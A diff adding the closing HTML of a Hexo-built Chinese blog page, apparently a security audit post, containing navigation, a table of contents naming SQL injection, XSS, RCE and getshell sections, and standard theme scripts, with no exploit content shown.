+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/blog/2024/01/28/240128mybtispubls%E6%8F%92%E4%BB%B6sql%E6%B3%A8%E5%85%A5/"
+                                   title="MybatisPuls分页插件中的SQL注入"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">MybatisPuls分页插件中的SQL注入</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E9%A6%96%E9%A1%B5%E6%90%9C%E7%B4%A2%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">后台首页搜索处存在SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E9%A6%96%E9%A1%B5%E6%90%9C%E7%B4%A2%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">前台首页搜索处存在SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E9%A6%96%E9%A1%B5%E5%82%A8%E5%AD%98%E5%9E%8BXSS"><span class="nav-text">前台首页储存型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4xss"><span class="nav-text">后台附件管理文件任意文件上传导致xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#other"><span class="nav-text">other</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E5%8E%8B%E7%BC%A9%E6%A0%A1%E9%AA%8C%E4%B8%8D%E6%AD%A3%E7%A1%AE%E5%AF%BC%E8%87%B4Getshell"><span class="nav-text">后台压缩校验不正确导致Getshell</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box shields">
+        
+            <div class="info-item">
+                
+                <a class="shields-item">
+                    <img src="https://img.shields.io/badge/Since-2023_--_2024-dodgerblue?style=flat-square">
+                </a>
+                
+                    <a class="shields-item" href="/blog/">
+                        <img src="https://img.shields.io/badge/WebMaster-Yu9-dodgerblue?style=flat-square">
+                    </a>
+                
+                
+                <a class="shields-item" href="https://hexo.io" target="_blank">
+                    <img src="https://img.shields.io/badge/Powered_by-Hexo-dodgerblue?style=flat-square">
+                </a>
+                <a class="shields-item" href="https://github.com/XPoet/hexo-theme-keep" target="_blank">
+                    <img class="shields-keep-version" src="https://img.shields.io/badge/Theme-Keep-dodgerblue?style=flat-square">
+                </a>
+                
+            </div>
+            
+                <div class="info-item">
+                    
+                        
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item shields">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">40.7k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E9%A6%96%E9%A1%B5%E6%90%9C%E7%B4%A2%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">后台首页搜索处存在SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E9%A6%96%E9%A1%B5%E6%90%9C%E7%B4%A2%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">前台首页搜索处存在SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E9%A6%96%E9%A1%B5%E5%82%A8%E5%AD%98%E5%9E%8BXSS"><span class="nav-text">前台首页储存型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4xss"><span class="nav-text">后台附件管理文件任意文件上传导致xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#other"><span class="nav-text">other</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E5%8E%8B%E7%BC%A9%E6%A0%A1%E9%AA%8C%E4%B8%8D%E6%AD%A3%E7%A1%AE%E5%AF%BC%E8%87%B4Getshell"><span class="nav-text">后台压缩校验不正确导致Getshell</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+
+</body>
+</html>
